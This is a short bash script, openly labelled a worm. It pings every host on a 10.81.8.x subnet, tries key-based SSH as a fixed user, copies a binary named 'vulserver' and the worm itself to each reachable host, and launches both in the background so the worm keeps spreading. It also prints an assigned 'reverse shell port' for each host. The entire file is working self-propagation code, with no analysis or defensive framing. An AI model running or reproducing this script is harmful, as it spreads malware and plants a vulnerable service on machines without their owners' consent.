#!/bin/bash

NETWORK_PREFIX="10.81.8"
PORT_BASE=4445
USERNAME="p4ultr4n"
ME=$(hostname -I | awk '{print $1}')
COUNT=0

echo "[*] Starting worm from $ME"

for i in $(seq 1 254); do
    TARGET="$NETWORK_PREFIX.$i"

    if [ "$TARGET" == "$ME" ]; then
        continue
    fi

    ping -c 1 -W 1 $TARGET &> /dev/null
    if [ $? -eq 0 ]; then
        echo "[+] $TARGET is up!"

        echo "[*] Trying user $USERNAME@$TARGET..."
        ssh -o BatchMode=yes -o ConnectTimeout=3 $USERNAME@$TARGET "echo 1" 2>/dev/null

        if [ $? -eq 0 ]; then
            echo "[+] Found working user: $USERNAME"

            scp /tmp/vulserver $USERNAME@$TARGET:/tmp/vulserver
            scp /tmp/worm.sh $USERNAME@$TARGET:/tmp/worm.sh

            PORT=$((PORT_BASE + COUNT))
            echo "[*] Assigning reverse shell port: $PORT"

            ssh $USERNAME@$TARGET "chmod +x /tmp/vulserver /tmp/worm.sh;
                                   nohup /tmp/vulserver 5000 >/dev/null 2>&1 & 
                                   sleep 1;
                                   nohup bash /tmp/worm.sh >/dev/null 2>&1 &" &

            COUNT=$((COUNT + 1))
        fi
    fi
done